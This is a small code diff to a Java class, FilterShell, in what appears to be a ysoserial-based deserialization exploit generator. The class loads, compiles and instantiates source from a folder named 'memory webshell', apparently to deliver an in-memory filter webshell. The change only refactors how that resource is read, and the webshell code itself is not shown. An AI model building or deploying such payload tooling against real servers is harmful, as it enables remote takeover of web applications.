@@ -6,6 +6,7 @@ import ysoserial.payloads.Eval;
 import ysoserial.payloads.RomeTools;
 import ysoserial.payloads.util.ClassFiles;
 import ysoserial.payloads.util.JavaCompiler;
+import ysoserial.payloads.util.ReadWrite;
 
 import java.io.InputStream;
 
@@ -17,8 +18,7 @@ public class FilterShell {
     }
 
     public Object getObject(Class gadget) throws Exception {
-        InputStream inputStream = FilterShell.class.getClassLoader().getResourceAsStream("内存马/FilterShell.java");
-        byte[] bytes = IOUtils.toByteArray(inputStream);
+        byte[] bytes = ReadWrite.readResource(FilterShell.class,"内存马/FilterShell.java");
         String java = new String(bytes);
         byte[] b = JavaCompiler.compile("FilterShell",java);
         Class c = ClassFiles.bytesAsClass(b);
